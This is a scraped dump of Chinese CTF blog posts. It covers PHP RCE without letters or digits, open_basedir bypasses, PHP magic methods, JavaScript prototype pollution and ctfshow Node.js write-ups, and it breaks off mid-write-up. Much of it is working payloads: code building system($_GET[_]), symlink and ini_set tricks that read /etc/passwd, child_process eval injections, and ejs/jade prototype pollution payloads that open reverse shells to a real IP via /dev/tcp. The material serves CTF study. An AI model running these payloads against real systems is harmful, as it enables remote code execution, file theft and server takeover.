1234567891011121314151617181920212223242526272829303132333435363738&lt;?php$_=[];$_=&quot;$_&quot;; //Array$_=$_['!'=='@']; //[0] 就是取字符A$_; //A$_++;$_++;$_++;$_++;$__=$_++; //E$_++;$___=$_++; //G$_++;$_++;$_++;$_++;$_++; //L$________=$_++;//m$_++;$_++;$_++;$_++;$_++;$_______=$_++;//s$____=$_++; //Tprint($__).&quot;\\n&quot;;print($___).&quot;\\n&quot;;print($____).&quot;\\n&quot;;$_____='_'.$___.$__.$____;print($_____).&quot;\\n&quot;; // _GET$_++;$_++;$_++;$_++;$______=$_++; //y$_________=$_______.$______.$_______.$____.$__.$________;//systemprint($_________); 1code=$_=[];$_=&quot;$_&quot;;$_=$_['!'=='@'];$_;$_++;$_++;$_++;$_++;$__=$_++;$_++;$___=$_++;$_++;$_++;$_++;$_++;$_++;$________=$_++;$_++;$_++;$_++;$_++;$_++;$_______=$_++;$____=$_++;$_____='_'.$___.$__.$____;$_++;$_++;$_++;$_++;$______=$_++;$_________=$_______.$______.$_______.$____.$__.$________;$_________($$_____[__]); system($_GET[_])确实可以，但是只能在7.*;按照原理不应该受到版本限制才对，经过我漫长的测试；终于找到了原因 原来在5.*的版本$_________($$_____[__]);中的$$_____会报错，只需要改成$_=$$_____;$_________($_[__]);就可以了 1code=$_=[];$_=&quot;$_&quot;;$_=$_['!'=='@'];$_;$_++;$_++;$_++;$_++;$__=$_++;$_++;$___=$_++;$_++;$_++;$_++;$_++;$_++;$________=$_++;$_++;$_++;$_++;$_++;$_++;$_______=$_++;$____=$_++;$_____='_'.$___.$__.$____;$_++;$_++;$_++;$_++;$______=$_++;$_________=$_______.$______.$_______.$____.$__.$________;$_=$$_____;$_________($_[__]); 在我本地的5.6成功了，但是我本地5.3依然没成功 在8.*的版本[]中的变量不可以用_； 注意：自增比上面两种方法更麻烦;","link":"/2024/01/27/%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97RCE/"},{"title":"open_basedir","text":"open_basedir是什么?open_basedir是PHP的一个安全特性，用于限制PHP脚本能够访问的文件和目录。当open_basedir被设置时，PHP脚本只能访问指定的目录，而不能访问其他目录。这有助于增加服务器的安全性，防止恶意脚本访问系统中的敏感文件。 注意： open_basedir 指定的限制实际上是前缀 而不是 目录名,举个例子， 若“open_basedir” = /tmp/zixyd那么目录/tmp/zixyd和 /tmp/zixyd1 都是可以访问的。 命令函数绕过open_basedir对system等一些命令函数没有限制， symlink绕过这种技巧感觉不难理解；只要自己认真想一下即可； 12345678910111213141516171819&lt;?phpmkdir(&quot;A&quot;);chdir(&quot;A&quot;);mkdir(&quot;B&quot;);chdir(&quot;B&quot;);mkdir(&quot;C&quot;);chdir(&quot;C&quot;);mkdir(&quot;D&quot;);chdir(&quot;D&quot;);chdir(&quot;..&quot;);chdir(&quot;..&quot;);chdir(&quot;..&quot;);chdir(&quot;..&quot;); //要读的文件需要往前跨多少路径，就得创建多少层的子目录，然后输入多少个../来设置目标文件。symlink(&quot;A/B/C/D&quot;,&quot;zixyd&quot;); //zixyd -&gt; A/B/C/D symlink(&quot;zixyd/../../../../etc/passwd&quot;,&quot;exp&quot;); //exp -&gt; zixyd/../../../../etc/passwdunlink(&quot;zixyd&quot;); //这两步操作是这个技巧的精华所在;有种偷梁换柱的感觉mkdir(&quot;zixyd&quot;);?&gt; 最终payload;在访问exp文件，即可得到/etc/passwd 1mkdir(&quot;A&quot;);chdir(&quot;A&quot;);mkdir(&quot;B&quot;);chdir(&quot;B&quot;);mkdir(&quot;C&quot;);chdir(&quot;C&quot;);mkdir(&quot;D&quot;);chdir(&quot;D&quot;);chdir(&quot;..&quot;);chdir(&quot;..&quot;);chdir(&quot;..&quot;);chdir(&quot;..&quot;);symlink(&quot;A/B/C/D&quot;,&quot;zixyd&quot;);symlink(&quot;zixyd/../../../../etc/passwd&quot;,&quot;exp&quot;);unlink(&quot;zixyd&quot;);mkdir(&quot;zixyd&quot;); chdir()与ini_set()组合这个技巧主要是open_basedir自身的缺陷造成的； ini_set('open_basedir','..');，open_basedir=..的意思是限制 PHP 脚本只能访问目录 .. 及其子目录中的文件，对其他目录的文件进行操作将被禁止,但是..代表的上一级目录，看似目录缩小了，其实是扩大了； 123456789101112&lt;?phpmkdir('zixyd');chdir('zixyd');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..'); ini_set('open_basedir','/');//最后要将..修改为/；否则无法访问根目录的文件echo file_get_contents('/etc/passwd');?&gt; 最终payload(但是我在一些php8的高版本没有成功，估计是修复了) 1mkdir('zixyd');chdir('zixyd');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');echo file_get_contents('/etc/passwd');","link":"/2024/01/27/open_basedir%E7%BB%95%E8%BF%87/"},{"title":"PHP魔术方法","text":"常见的魔术方法12345678910111213141516__construct()，类的构造函数__destruct()，类的析构函数__call()，在对象中调用一个不可访问方法时调用__callStatic()，用静态方式中调用一个不可访问方法时调用__get()，获得一个类的成员变量时调用__set()，设置一个类的成员变量时调用__isset()，当对不可访问属性调用isset()或empty()时调用__unset()，当对不可访问属性调用unset()时被调用__sleep()，执行serialize()时，先会调用这个函数__wakeup()，执行unserialize()时，先会调用这个函数__toString()，类被当成字符串时的回应方法__invoke()，调用函数的方式调用一个对象时的回应方法__set_state()，调用var_export()导出类时，此静态方法会被调用__clone()，当对象复制完成时调用__autoload()，尝试加载未定义的类__debugInfo()，打印所需调试信息 Example123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109&lt;?phphighlight_file(__FILE__);echo &quot;&lt;br&gt;&quot;;class magic_test{ public $data1=&quot;zIxyd&quot;; public $data2=&quot;writeup&quot;; public function print_dat() { echo $this-&gt;data1 . &quot; &quot; .$this-&gt;data2 . &quot;&lt;br&gt;&quot;; } public function __construct() {//构造函数 echo &quot;__construct&lt;br&gt;&quot;; } public function __destruct() {//析构函数 echo &quot;__destruct&lt;br&gt;&quot;; } public function __wakeup() {//执行unserialize时调用 echo &quot;__wakeup&lt;br&gt;&quot;; } public function __sleep() {//执行serialize时调用 echo &quot;__sleep&lt;br&gt;&quot;; return array(&quot;data1&quot;,&quot;data2&quot;); //__sleep()该函数必须返回一个需要进行序列化保存的成员属性数组 //并且只序列化该函数返回的这些成员属性 } public function __toString() {//类被当成字符串时的回应方法 //echo &quot;__toString&lt;br&gt;&quot;; return &quot;__toString&lt;br&gt;&quot;; } function __call($name, $arg) {//在对象中调用一个不可访问方法时调用 //不存在的方法名是$name，参数是数组形式 echo &quot;$name&lt;br&gt;&quot;; var_dump($arg); echo &quot;&lt;br&gt;&quot;; } function __invoke() {//调用函数的方式调用一个对象时的回应方法 echo &quot;__invoke&lt;br&gt;&quot;; } function __get($key) {//获得一个类中不可访问的成员变量时(未定义或私有属性) echo &quot;__get&lt;br&gt;&quot;; } function __set($arg1,$arg2) {//给一个类中不可访问的成员变量赋值时 echo &quot;__set&lt;br&gt;&quot;; echo &quot;$arg1:$arg2 &lt;br&gt;&quot;; }}//创建对象，调用__constructecho &quot;准备创建对象&lt;br&gt;&quot;;$obj = new magic_test();echo &quot;创建对象完成&lt;br&gt;&quot;;//序列化对象，调用__sleepecho &quot;准备序列化对象&lt;br&gt;&quot;;$serialized = serialize($obj);echo &quot;序列化对象完成&lt;br&gt;&quot;;//类被当成字符串输出，调用__toStringecho &quot;准备输出类&lt;br&gt;&quot;;echo $obj;echo &quot;输出类完毕&lt;br&gt;&quot;;//类被当成方法调用输出，调用__invokeecho &quot;准备把对象当作方法调用&lt;br&gt;&quot;;$obj();echo &quot;把对象当作方法调用完毕&lt;br&gt;&quot;;//输出序列化之后的字符串echo &quot;打印序列化之后的对象 &quot;;echo &quot;serialized： &quot;.$serialized.&quot;&lt;br&gt;&quot;;echo &quot;打印完成&lt;br&gt;&quot;;//调用一个不存在的方法，调用__callecho &quot;准备调用不存在的方法hack&lt;br&gt;&quot;;$obj-&gt;hack('arg1','arg2',3);echo &quot;调用不存在的方法hack完毕&lt;br&gt;&quot;;//获得一个类不存在的成员变量时，调用__getecho &quot;准备访问对象不存在的字段&lt;br&gt;&quot;;$function = $obj-&gt;nono;echo &quot;访问对象不存在的字段完毕&lt;br&gt;&quot;;//获得一个类不存在的成员变量时，调用__setecho &quot;准备设置对象不存在的字段&lt;br&gt;&quot;;$obj-&gt;onon = 123;echo &quot;设置对象不存在的字段完毕&lt;br&gt;&quot;;//重建对象(反序列化)，调用__wakeupecho &quot;准备反序列化对象&lt;br&gt;&quot;;$obj2=unserialize($serialized);echo &quot;反序列化完成&lt;br&gt;&quot;;//调用方法echo &quot;准备调用方法&lt;br&gt;&quot;;$obj2-&gt;print_dat();echo &quot;调用结束&lt;br&gt;&quot;;//反序列化后会额外在调用__destruct//脚本结束 调用__destruct?&gt;","link":"/2024/01/29/PHP%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95/"},{"title":"http-header伪造ip","text":"123456789Client-IP: 127.0.0.1X-Client-IP: 127.0.0.1X-Real-IP: 127.0.0.1True-Client-IP: 127.0.0.1X-Originating-IP: 127.0.0.1X-Forwarded-For: 127.0.0.1X-Remote-IP: 127.0.0.1X-Remote-Addr: 127.0.0.1X-Forwarded-Host: 127.0.0.1","link":"/2024/01/30/http-header%E4%BC%AA%E9%80%A0ip/"},{"title":"js原型污染","text":"什么是原型污染？原型污染是一个 JavaScript(nodejs) 漏洞，攻击者可以利用它向全局对象原型添加任意属性，然后用户定义的对象可以继承这些属性。 原型链污染又分为客户端原型链污染和服务端原型链污染；在ctf中基本都是服务端污染导致绕过验证,得到管理员权限或者RCE等等; JavaScript 中的原型是什么？JavaScript 中的每个对象都链接到某种类型的另一个对象，称为原型。JavaScript 使用原型继承模型，这与许多其他语言使用的基于类的模型有很大不同。默认情况下，JavaScript 会自动将新对象分配给其内置原型之一。例如，字符串会自动分配内置的String.prototype. 您可以在下面看到这些全局原型的更多示例： 1234567891011let myObject = {};Object.getPrototypeOf(myObject); // Object.prototypelet myString = &quot;&quot;;Object.getPrototypeOf(myString); // String.prototypelet myArray = [];Object.getPrototypeOf(myArray); // Array.prototypelet myNumber = 1;Object.getPrototypeOf(myNumber); // Number.prototype 对象会自动继承其指定原型的所有属性，除非它们已经拥有具有相同键的自己的属性。这使得开发人员能够创建可以重用现有对象的属性和方法的新对象。 内置原型提供了用于处理基本数据类型的有用属性和方法。例如，String.prototype对象有一个toLowerCase()方法。因此，所有字符串都会自动有一个现成的方法将它们转换为小写。这使得开发人员不必手动将此行为添加到他们创建的每个新字符串中。 对象继承是如何工作的？每当您引用对象的属性时，JavaScript 引擎都会首先尝试直接在对象本身上访问该属性。如果对象没有匹配的属性，JavaScript 引擎会在对象的原型上查找它。 原型链请注意，一个对象的原型只是另一个对象，该对象也应该有自己的原型，依此类推。由于实际上 JavaScript 中的所有内容都是底层的对象，因此这条链最终会回到顶层Object.prototype，其原型很简单null。 至关重要的是，对象不仅从其直接原型继承属性，而且从原型链中位于其上方的所有对象继承属性。在上面的示例中，这意味着username对象可以访问String的属性和方法。String.prototype and Object.prototype. 使用 __proto__ 访问对象的原型每个对象都有一个特殊的属性，您可以使用它来访问其原型。尽管它没有正式的标准化名称，但__proto__它是大多数浏览器使用的事实上的标准。您可以使用它来读取原型及其属性，甚至在必要时重新分配它们。 与任何属性一样，您可以__proto__使用括号或点符号进行访问： 12username.__proto__username['__proto__'] 甚至可以链接引用以__proto__沿着原型链向上工作： 123username.__proto__ // String.prototypeusername.__proto__.__proto__ // Object.prototypeusername.__proto__.__proto__.__proto__ // null 修改原型修改原型可以像修改任何其他对象一样修改 JavaScript 的内置原型。这意味着开发人员可以自定义或重写内置方法的行为，甚至添加新方法来执行有用的操作。 例如，现代 JavaScript 提供了trim()字符串方法，使您能够轻松删除任何前导或尾随空格。在引入此内置方法之前，开发人员有时会String.prototype通过执行以下操作将自己的此行为的自定义实现添加到对象中： 1String.prototype.removeWhitespace = function(){ // remove leading and trailing whitespace } 由于原型继承，所有字符串都可以访问此方法： 1let searchTerm = &quot; example &quot;; searchTerm.removeWhitespace(); // &quot;example&quot; 原型污染漏洞是如何产生的？当JavaScript函数递归地将包含用户可控属性的对象合并到现有对象时，通常会出现原型污染漏洞。这可以允许攻击者注入带有类似__proto__的键的属性，以及任意嵌套的属性。 由于__proto__在JavaScript上下文中的特殊含义，合并操作可能会将嵌套属性分配给对象的原型，而不是目标对象本身。因此，攻击者可以用包含恶意值的属性污染原型，这些属性随后可能被应用程序以危险的方式使用。 更多参考 prototype , __proto__prototype 和 __proto__ 是 JavaScript 中与原型（prototype）相关的两个重要概念，但它们有不同的用途和含义。 prototype: prototype 是函数对象特有的属性。每个函数都有一个 prototype 属性，这个prototype属性是一个指向原型对象的指针，它包含了可以由该函数的实例继承的属性和方法。 当你创建一个新的函数时，JavaScript 自动为该函数创建一个 prototype 对象，并赋值给 prototype 属性。 通过 prototype 对象，你可以定义函数的共享属性和方法，它将被该函数的所有实例所共享。 12345678910111213141516171819// 定义构造函数function Person(name, age) { // 实例属性 this.name = name; this.age = age; } // 在构造函数的 prototype 上定义共享方法 Person.prototype.sayHello = function() { console.log(`Hello, my name is ${this.name} and I am ${this.age} years old.`); }; // 创建实例 const person1 = new Person(&quot;Alice&quot;, 25); const person2 = new Person(&quot;Bob&quot;, 30); // 调用共享方法 person1.sayHello(); // 输出: Hello, my name is Alice and I am 25 years old. person2.sayHello(); // 输出: Hello, my name is Bob and I am 30 years old. proto: __proto__ 是每个对象都具有的属性，用于指向其构造函数的原型。它是一个指向该对象的原型链上一层的链接。 __proto__ 属性是非标准的，尽管大多数现代浏览器都支持它，但它已经被 ECMAScript 6 标准中的 Object.getPrototypeOf 方法所替代。 __proto__ 主要用于获取和设置对象的原型。 12345678910111213141516171819202122232425const myObject= {};const myObjectPrototype = Object.getPrototypeOf(myObject);console.log(myObjectPrototype === Object.prototype); //trueconsole.log(myObject.__proto__ === Object.prototype); //trueconst myString = &quot;&quot;;const myStringPrototype = Object.getPrototypeOf(myString);console.log(myStringPrototype.__proto__ === Object.prototype); //trueconst myArray = [];const myArrayPrototype = Object.getPrototypeOf(myArray);console.log(myArrayPrototype.__proto__ === Object.prototype); //trueconst myNumber = 1;const myNumberPrototype = Object.getPrototypeOf(myNumber);console.log(myNumberPrototype.__proto__ === Object.prototype); //true//======================================================================console.log(Object.getPrototypeOf(myString)) //{}console.log(Object.getPrototypeOf(myNumber)) //{}console.log(Object.getPrototypeOf(myString) ==Object.getPrototypeOf(myNumber)) //falseconsole.log(Object.getPrototypeOf(myString).__proto__ ==Object.getPrototypeOf(myNumber).__proto__) //true//下面解释为什么是 false?//在 JavaScript 中，Object.getPrototypeOf 用于获取对象的原型。在代码中，myString 是一个空字符串，而 myNumber 是一个数字。当调用 Object.getPrototypeOf(myString) 时，它返回的是字符串的原型对象 String.prototype。同样，Object.getPrototypeOf(myNumber) 返回的是数字的原型对象 Number.prototype。虽然输出结果都是 {} 对象，但它们是不同的对象。这是因为 {} 是表示一个空对象字面量的方式，而不是真正的空对象。在 JavaScript 中，每次调用 Object.getPrototypeOf 都会返回一个新的对象，即使它们有着相同的结构和原型链。 总的来说，prototype 用于构造函数，帮助定义共享属性和方法，而 __proto__ 是每个对象都有的属性，用于指向其构造函数的原型。Object.getPrototypeOf 方法是更推荐使用的获取原型的方式，而 __proto__ 在现代 JavaScript 中已经不再建议使用。 一个简单的案例 1234567891011121314const myObject = { a: 1, b: 2 };Object.prototype.c = 3;myObject.__proto__.d = 4;for(const propertyKey in myObject){ console.log(propertyKey);}//输出：//a//b//c//d 这也适用于数组，其中for...in循环首先迭代每个索引（本质上只是底层的数字属性键），然后再继续处理任何继承的属性。 1234567891011121314151617const myArray = ['a','b'];Object.prototype.c = 3;myArray.__proto__.d = 4;for(const arrayKey in myArray){ console.log(arrayKey);}//输出//0//1//d//c//下面解释为什么键“c”输出在“d”的后面？//在这个例子中，给 Object.prototype 添加了一个属性 c，并给 myArray.__proto__ 添加了一个属性 d。当您使用 for...in 循环迭代数组时，它会遍历对象的所有可枚举属性，包括原型链上的属性。在JavaScript中，Object.prototype 是所有对象的原型链的顶部，因此它的属性会在其他原型上的属性之前被遍历。在这里，c 是添加到所有对象的原型链上的属性，而 d 是添加到 myArray.__proto__ 上的属性。因此，在 for...in 循环中，d 的输出在 c 之前，因为 myArray.__proto__ 的属性会先被遍历。 通过 JSON 输入造成原型污染JSON.parse()在ctf中最常见的莫过于JSON.parse()函数了； 用户可控的对象通常是使用该JSON.parse()方法从 JSON 字符串派生的。有趣的是，JSON.parse()还将 JSON 对象中的任何键视为任意字符串，包括__proto__. 这为原型污染提供了另一个潜在载体。 假设攻击者通过网络消息注入以下恶意 JSON： 12345{ &quot;__proto__&quot;: { &quot;evilProperty&quot;: &quot;payload&quot; }} 如果通过该方法将其转换为 JavaScript 对象JSON.parse()，则生成的对象实际上将具有一个带有 key 的属性__proto__： 12345const objectLiteral = {__proto__: {evilProperty: 'payload'}};const objectFromJson = JSON.parse('{&quot;__proto__&quot;: {&quot;evilProperty&quot;: &quot;payload&quot;}}');console.log(objectLiteral.hasOwnProperty('__proto__')); // falseconsole.log(objectFromJson.hasOwnProperty('__proto__')); // true 注意：在Node.js中，hasOwnProperty函数是JavaScript中的一个内置函数，用于检查对象自身是否包含指定的属性（即不包括从原型链继承的属性）。这个函数返回一个布尔值，如果对象包含指定的属性，则返回true，否则返回false。 例如： 1234let obj = {a: 1, b: 2};console.log(obj.hasOwnProperty('a')); // trueconsole.log(obj.hasOwnProperty('c')); // false Example12345678910111213141516171819202122232425262728293031323334353637function merge(target, source) { for (let key in source) { if (key in source &amp;&amp; key in target) { // console.log(key) // console.log(target[key]) // console.log(source[key]) merge(target[key], source[key]) } else { target[key] = source[key] } }}let object1 = {}let object2 = JSON.parse('{&quot;a&quot;: 1, &quot;__proto__&quot;: {&quot;b&quot;: 2}}')merge(object1, object2)console.log(object1.a, object1.b) //1 2object3 = {}console.log(object3.b) //2let object4 = &quot;&quot;console.log(object4.b) //2// console.log(object2.hasOwnProperty('a'));// console.log(object2.hasOwnProperty('b'));// console.log(object2.hasOwnProperty('__proto__'));// console.log(object1.__proto__);// console.log(object2.__proto__);// console.log(object3.__proto__);//我将大致解释一下这段代码是如何通过merge函数污染到object3的属性的(这样说也许不太对，应该是污染到了原型的属性，所以新建一个对象，都会拥有b属性)//JSON.parse在上面已经分析过了；这里主要看merge函数；//第一次循环:&quot;a&quot;: 1//单纯的将object2的a属性赋值给object1//第二次循环:&quot;__proto__&quot;: {&quot;b&quot;: 2}//首先将__proto__赋值给key;//if (key in source &amp;&amp; key in target)判断为真，因为target也就是object2有__proto__属性，这一点可以用hasOwnProperty函数更能看明白//如果判断为真，递归merge函数，这里注意 传递的第一个参数是object1.__proto__和第二个参数object2.__proto__ == ({&quot;b&quot;: 2})//接着会向object1.__proto__赋值b属性，而object1.__proto__就是原型，所以整个原型污染流程结束 服务器端原型污染记录一下portswigger上的实验；漏洞点都是在一个修改个人形象的功能点，后端是基于 Node.js 和 Express 框架构建。它很容易受到服务器端原型污染的影响，因为它将用户可控的输入不安全地合并到服务器端 JavaScript 对象中。 污染进行权限升级用bp抓包;往请求包中用__proto__尝试原型污染；然后发送请求。可以看到响应包中出现了&quot;hacker&quot;:&quot;zIxyd&quot; 1&quot;__proto__&quot;:{&quot;hacker&quot;:&quot;zIxyd&quot;} 确认存在原型链污染，发送恶意数据， 1&quot;__proto__&quot;:{&quot;isAdmin&quot;:true} 检测服务器端原型污染大多数时候，即使您成功污染了服务器端原型对象，您也不会在响应中看到受影响的属性。也就是说你在一个点上无法判断是否存在原型污染；那该怎么办呢？ 一种方法是尝试注入与服务器的潜在配置选项相匹配的属性。然后，您可以比较注入前后服务器的行为，以查看此配置更改是否已生效。如果是这样，这强烈表明您已成功发现服务器端原型污染漏洞。 状态码覆盖Express 等服务器端 JavaScript 框架允许开发人员设置自定义 HTTP 响应状态。如果出现错误，JavaScript 服务器可能会发出通用 HTTP 响应，但在正文中包含 JSON 格式的错误对象。这是提供有关错误发生原因的附加详细信息的一种方法，这从默认 HTTP 状态中可能并不明显。 Node 的http-errors模块包含以下用于生成此类错误响应的函数： 12345678910111213function createError () { //... if (type === 'object' &amp;&amp; arg instanceof Error) { err = arg //注意下面这一行 status = err.status || err.statusCode || status } else if (type === 'number' &amp;&amp; i === 0) { //... if (typeof status !== 'number' || (!statuses.message[status] &amp;&amp; (status &gt; 400 || status &gt;= 600))) { status = 500 } //... “ //注意下面这一行”显示的下一行试图通过读取传递给函数的对象的status或statusCode属性来分配状态变量。如果网站的开发人员没有明确地为错误设置状态属性，你可以使用它来探测原型污染； 注意：根据代码分析，我们要修改的状态码必须在400和600之间，否则为状态码为500 再次声明，实验环境用的是：portswigger 多加了一个双引号，使得json格式不对，返回报错状态码为400 尝试污染status的值 123&quot;__proto__&quot;: { &quot;status&quot;:555} 再次使得json格式错乱，查看报错状态码为555,说明已经污染成功了 JSON 空格覆盖Express 框架提供了一个json spaces选项，使您能够配置用于缩进响应中任何 JSON 数据的空格数。在许多情况下，开发人员不会定义此属性，因为他们对默认值感到满意，这使其容易受到原型链的污染。 如果您可以访问任何类型的 JSON 响应，则可以尝试使用自己的json spaces属性污染原型，然后重新发出相关请求以查看 JSON 中的缩进是否相应增加。您可以执行相同的步骤来删除缩进以确认漏洞。 这是一项特别有用的技术，因为它不依赖于所反映的特定属性。它也非常安全，因为您只需将属性重置为与默认值相同的值即可有效地打开和关闭污染。 尽管 Express 4.17.4 中已经修复了原型污染问题，但未升级的网站可能仍然容易受到攻击。 123&quot;__proto__&quot;:{ &quot;json spaces&quot;:10} 除了上面介绍的俩种；还有字符集覆盖方法等等 绕过过滤造成原型污染有时会过滤__proto__，但是这种关键的过滤方法并不是一个强大的长期解决方案，因为有多种方法可能会绕过它。 __proto__节点应用程序还可以分别使用命令行标志--disable-proto=delete或来完全 删除或禁用--disable-proto=throw。然而，这也可以通过使用构造函数技术来绕过。 实验 多次发送json spaces请求,但是响应包没有反应 每个构造函数(constructor)都有一个原型对象(prototype); 上面已经解释的很清楚了 constructor.prototype === __proto__ 12345678910111213let myObject = {}myObject.constructor.prototype.b = 'zIxyd' for(const propertyKey in myObject){ console.log(propertyKey); //b}let myString = &quot;&quot; //zIxydconsole.log(myString.b)console.log(myObject.__proto__) //[Object: null prototype] { b: 'zIxyd' }console.log(myObject.constructor.prototype === myObject.__proto__) //true 尝试使用constructor； 12345&quot;constructor&quot;: { &quot;prototype&quot;: { &quot;json spaces&quot;:10 }} ToolsServer-Side Prototype Pollution Scanner https://portswigger.net/research/server-side-prototype-pollution","link":"/2024/01/31/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/"},{"title":"ctfshow(nodejs)","text":"web334(toUpperCase)123456#user.jsmodule.exports = { items: [ {username: 'CTFSHOW', password: '123456'} ]}; 1234567891011121314151617181920212223242526272829303132333435#login.jsvar express = require('express');var router = express.Router();var users = require('../modules/user').items; var findUser = function(name, password){ return users.find(function(item){ return name!=='CTFSHOW' &amp;&amp; item.username === name.toUpperCase() &amp;&amp; item.password === password; });};/* GET home page. */router.post('/', function(req, res, next) { res.type('html'); var flag='flag_here'; var sess = req.session; var user = findUser(req.body.username, req.body.password); if(user){ req.session.regenerate(function(err) { if(err){ return res.json({ret_code: 2, ret_msg: '登录失败'}); } req.session.loginUser = user.username; res.json({ret_code: 0, ret_msg: '登录成功',ret_flag:flag}); }); }else{ res.json({ret_code: 1, ret_msg: '账号或密码错误'}); } });module.exports = router; 存在逻辑漏洞 1return name!=='CTFSHOW' &amp;&amp; item.username === name.toUpperCase() &amp;&amp; item.password === password; 用小写用户名登陆 12ctfshow123456 web335(child_process)查看源代码 1&lt;!-- /?eval= --&gt; eval在nodejs中也是可以将参数当作nodejs代码执行的,和php类似 1eval(console.log(require(&quot;child_process&quot;).execSync(&quot;whoami&quot;).toString())); payload 1?eval=require(&quot;child_process&quot;).execSync(&quot;cat f*&quot;).toString() web336(exec过滤)和上题基本类似，只是过滤了’exec’； 可以用+拼接绕过 1?eval=require(&quot;child_process&quot;)['exe'%2B'cSync']('ls').toString() 或者用spawnSync 1?eval=require( 'child_process' ).spawnSync( 'ls', [ '/' ] ).stdout.toString() web337(md5绕过)给了源码 12345678910111213141516171819202122232425var express = require('express');var router = express.Router();var crypto = require('crypto');function md5(s) { return crypto.createHash('md5') .update(s) .digest('hex');}/* GET home page. */router.get('/', function(req, res, next) { res.type('html'); var flag='xxxxxxx'; var a = req.query.a; var b = req.query.b; if(a &amp;&amp; b &amp;&amp; a.length===b.length &amp;&amp; a!==b &amp;&amp; md5(a+flag)===md5(b+flag)){ res.end(flag); }else{ res.render('index',{ msg: 'tql'}); } });module.exports = router; 上面是对象，下面是数组； 123456789101112131415let a = {'x':1}let b = {'x':2}console.log(a+&quot;flag{xxx}&quot;)console.log(b+&quot;flag{xxx}&quot;)a = [1]b = [2]console.log(a+&quot;flag{xxx}&quot;)console.log(b+&quot;flag{xxx}&quot;)var a =[1]console.log(a)console.log(typeof a); //object payload，更准确的来讲是用对象绕过md5 1?a[c]=2&amp;b[c]=3 web338(pollution)考的原型链污染，可以看我这篇博客， https://zixyd.github.io/2024/01/31/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/ 给了源码 123456789101112131415router.post('/', require('body-parser').json(),function(req, res, next) { res.type('html'); var flag='flag_here'; var secert = {}; var sess = req.session; let user = {}; utils.copy(user,req.body); if(secert.ctfshow==='36dboy'){ res.end(flag); }else{ return res.json({ret_code: 2, ret_msg: '登录失败'+JSON.stringify(user)}); } }); 其中utils.copy，就是一个原型链污染漏洞利用点 123456789function copy(object1, object2){ for (let key in object2) { if (key in object2 &amp;&amp; key in object1) { copy(object1[key], object2[key]) } else { object1[key] = object2[key] } } } web339(RCE)12345678910111213141516#login.jsrouter.post('/', require('body-parser').json(),function(req, res, next) { res.type('html'); var flag='flag_here'; var secert = {}; var sess = req.session; let user = {}; utils.copy(user,req.body); if(secert.ctfshow===flag){ res.end(flag); }else{ return res.json({ret_code: 2, ret_msg: '登录失败'+JSON.stringify(user)}); } }); 123456#api.jsrouter.post('/', require('body-parser').json(),function(req, res, next) { res.type('html'); res.render('api', { query: Function(query)(query)}); }); 由于我们并不知道flag的值，无法通过res.end(flag);来获取flag，只能通过api中的{ query: Function(query)(query)}来rce获取flag; 这种形式，只要query的值可以控制，那么就可以命令执行，query的值可以通过copy函数原型链污染控制 Function环境下没有require函数，不能获得child_process模块，我们可以通过使用process.mainModule.constructor._load来代替require。 1{&quot;__proto__&quot;:{&quot;query&quot;:&quot;return global.process.mainModule.constructor._load('child_process').exec('bash -c \\&quot;bash -i &gt;&amp; /dev/tcp/81.71.13.76/5557 0&gt;&amp;1\\&quot;')&quot;}} 下面这个payload是ejs低版本存在漏洞 https://blog.csdn.net/lastwinn/article/details/128914419 1234567{ &quot;constructor&quot;: { &quot;prototype&quot;: { &quot;outputFunctionName&quot;:&quot;_tmp1;global.process.mainModule.require('child_process').exec('bash -c \\&quot;bash -i &gt;&amp; /dev/tcp/81.71.13.76/5557 0&gt;&amp;1\\&quot;');var __tmp2&quot; } }} web340(rce)1234567891011121314151617#login.jsrouter.post('/', require('body-parser').json(),function(req, res, next) { res.type('html'); var flag='flag_here'; var user = new function(){ this.userinfo = new function(){ this.isVIP = false; this.isAdmin = false; this.isAuthor = false; }; } utils.copy(user.userinfo,req.body); if(user.userinfo.isAdmin){ res.end(flag); }else{ return res.json({ret_code: 2, ret_msg: '登录失败'}); } 和上一题类似，user.userinfo的上一级是user,user的上一级才是原生；只需要污染两级 1{&quot;__proto__&quot;:{&quot;__proto__&quot;:{&quot;query&quot;:&quot;return global.process.mainModule.constructor._load('child_process').exec('bash -c \\&quot;bash -i &gt;&amp; /dev/tcp/xxx/xxx 0&gt;&amp;1\\&quot;')&quot;}}} web341(ejs)从上一题的基础上少了api文件，那么只能用ejs的payload去打 1{&quot;__proto__&quot;:{&quot;__proto__&quot;:{&quot;outputFunctionName&quot;:&quot;_tmp1;global.process.mainModule.require('child_process').exec('bash -c \\&quot;bash -i &gt;&amp; /dev/tcp/81.71.13.76/5555 0&gt;&amp;1\\&quot;');var __tmp2&quot;}}} web342-343(jade)和上一题类似，只不过渲染引擎换成了jade 1app.engine('jade', require('jade').__express); https://www.anquanke.com/post/id/236354#h2-3 payload 123{&quot;__proto__&quot;:{&quot;__proto__&quot;: {&quot;type&quot;:&quot;Code&quot;,&quot;compileDebug&quot;:true,&quot;self&quot;:true,&quot;line&quot;:&quot;0, \\&quot;\\&quot; ));return global.process.mainModule.constructor._load('child_process').execSync('bash -c \\&quot;bash -i &gt;&amp; /dev/tcp/81.71.13.76/5556 0&gt;&amp;1\\&quot;');//&quot;}}} {&quot;__proto__&quot;:{&quot;__proto__&quot;: {&quot;type&quot;:&quot;Block&quot;,&quot;nodes&quot;:&quot;&quot;,&quot;compileDebug&quot;:1,&quot;self&quot;:1,&quot;line&quot;:&quot;global.process.mainModule.require('child_process').exec('bash -c \\&quot;bash -i &gt;&amp; /dev/tcp/xx/6666 0&gt;&amp;1\\&quot;')&quot;}}} web344(,)1234567891011121314router.get('/', function(req, res, next) { res.type('html'); var flag = 'flag_here'; if(req.url.match(/8c|2c|\\,/ig)){ res.end('where is flag :)'); } var query = JSON.parse(req.query.query); if(query.name==='admin'&amp;&amp;query.password==='ctfshow'&amp;&amp;query.isVIP===true){ res.end(flag); }else{ res.end('where is flag. :)'); }}); 本来是 